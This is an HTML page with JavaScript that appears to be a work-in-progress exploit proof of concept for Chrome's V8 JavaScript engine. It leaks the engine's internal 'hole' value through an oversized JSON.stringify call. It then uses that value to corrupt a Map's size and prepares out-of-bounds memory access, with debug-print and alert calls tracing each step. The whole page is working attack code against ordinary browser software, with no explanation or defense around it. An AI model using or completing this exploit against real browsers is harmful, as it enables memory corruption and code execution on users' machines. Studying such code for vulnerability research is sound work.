<html>
    <pre id='log'></pre>
    <script>
        function log(str) {
            var _log = document.getElementById('log');
            if (_log) {
                _log.innerText += str + '\n';
            }
        }
        function trigger_starlabs() {
            let a = [], b = [];
            let s = '"'.repeat(0x800000);
            a[20000] = s;
            for (let i = 0; i < 10; i++) a[i] = s;
            for (let i = 0; i < 10; i++) b[i] = a;

            try {
                JSON.stringify(b);
            } catch (hole) {
                return hole;
            }
            throw new Error('could not trigger');
        }
        /*
        var map2 = new Map();
        %DebugPrint(map2);
        map2.set(1, 1);
        alert("map2.set(1, 1);")
        map2.set(2, 1);
        alert("map2.set(2, 1);")
        map2.set(3, 1);
        alert("map2.set(3, 1);")
        map2.delete(1);
        alert("map2.delete(1);");
        map2.delete(1);
        alert("map2.delete(1);");
        alert(map2.size);
        */
        let hole = trigger_starlabs();
        log("[+] Accessing the hole like so seems to stablize the oob? " + hole);
        %DebugPrint(hole);
        var map = new Map();
        %DebugPrint(map);
        map.set(1, 1);
        alert("map.set(1, 1);")
        map.set(hole, 1);
        alert("map.set(hole, 1);");
        map.delete(hole);
        alert("map.delete(hole);");
        map.delete(hole);
        alert("map.delete(hole);");
        map.delete(1);
        alert("map.delete(1);");
        alert(map.size);
        %DebugPrint(map);
        alert("ready for some sussy stuff?");

        map.set(0x1c, -1);
        alert("map	.set(0x1c, -1);");
        map.set(0x111, 0);
        alert("map.set(0x111, 0);");

    </script>
</html>